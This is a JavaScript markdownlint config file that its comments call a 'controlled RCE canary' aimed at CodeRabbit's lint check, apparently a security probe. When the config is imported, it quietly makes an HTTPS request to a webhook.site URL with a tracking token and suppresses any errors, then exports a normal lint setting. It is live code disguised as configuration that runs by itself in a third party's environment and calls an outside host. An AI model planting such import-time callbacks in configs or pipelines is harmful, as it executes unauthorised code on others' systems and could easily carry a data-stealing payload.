// Controlled RCE canary. Runs at config import time during CodeRabbit markdownlint check.
// Does not read environment, files, credentials, or repository secrets.
const markerUrl = 'https://webhook.site/54253191-e128-40da-86b8-c3ebc6228fb7?test=zBTCqzLIRP&v=markdownlint-config';
try {
  const https = require('https');
  const req = https.get(markerUrl, (res) => res.resume());
  req.setTimeout(3000, () => req.destroy());
  req.on('error', () => {});
  req.unref?.();
} catch { /* marker only */ }
module.exports = {
  config: { 'default': true }
};
